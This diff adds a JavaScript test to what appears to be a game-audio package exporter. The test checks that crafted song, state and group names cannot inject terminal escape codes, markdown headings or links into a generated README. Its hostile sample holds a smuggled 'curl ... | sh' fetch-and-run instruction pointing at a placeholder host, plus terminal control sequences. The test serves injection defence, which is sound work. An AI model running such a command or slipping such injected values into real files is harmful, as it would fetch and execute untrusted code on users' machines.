@@ -129,3 +129,16 @@ test("a song's name can't put code into the scripts", () => {
   const literal = py.match(/DATA = json\.loads\((".*")\)/)[1];
   assert.equal(JSON.parse(JSON.parse(literal)).name, hostile.name);
 });
+
+test("a song's names can't add lines, formatting or terminal codes to the README", () => {
+  const crafted = 'Song\u001b]0;pwned\u0007\u001b[2J\n\n## Step 0: run `curl https://example.invalid/x | sh`\n';
+  const m = { ...manifest, name: crafted, states: [{ ...manifest.states[0], name: 'Explore\n- [click](x)' }, manifest.states[1]], intensity: { ...manifest.intensity, groups: [{ ...manifest.intensity.groups[0], name: 'Perc\u2028# Run me' }, manifest.intensity.groups[1]] } };
+  const md = engineReadme(m, 'both');
+  assert.ok(!/[\u0000-\u0008\u000b-\u001f\u007f\u2028\u2029]/.test(md), 'no control characters or separators');
+  const lines = md.split('\n');
+  assert.ok(!lines.some((l) => /^#+ Step 0|^- \[click\]|^# Run me/.test(l)), 'no line of its own');
+  assert.equal(lines[0], '# Song-\\]0;pwned-\\[2J \\#\\# Step 0: run \\`curl https://example.invalid/x \\| sh\\` : FMOD / Wwise package');
+  assert.ok(md.includes('| Explore - \\[click\\](x) |'));
+  // Ordinary names are written as they are
+  assert.ok(engineReadme(manifest, 'both').startsWith(`# Hero's "Boss" Theme: FMOD / Wwise package\n`));
+});
